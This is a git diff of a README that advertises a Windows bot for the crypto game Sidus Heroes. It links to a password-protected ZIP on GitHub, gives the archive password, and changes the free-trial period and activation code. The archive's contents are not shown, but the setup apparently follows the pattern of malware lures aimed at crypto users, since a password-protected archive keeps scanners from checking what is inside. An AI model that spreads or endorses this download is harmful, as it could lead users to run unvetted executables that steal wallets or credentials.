@@ -5,9 +5,9 @@
 
 # [>>>⚡️ Click to DOWNLOAD BOT ⚡<<<](https://github.com/cryptonite-bot/sidusheroes-bot/raw/main/SIDUS%20HEROES%20BOT.zip)
 # Password to archive: sidus
-## 30 days free code activation (G35S-53MS-935L-2SQC)
+## 60 days free code activation (53GS-5S3G7-132S-9KCC)
 ![alt-текст](https://s2.coinmarketcap.com/static/img/coins/64x64/15463.png)
-##### (use the bot for the first 30 days for free! then the cost will be $ 5 per month)
+##### (use the bot for the first 60 days for free! then the cost will be $ 5 per month)
 
 ### 💻 Only for Windows 7/8/8.1/10/++
 #### How to use basic bots
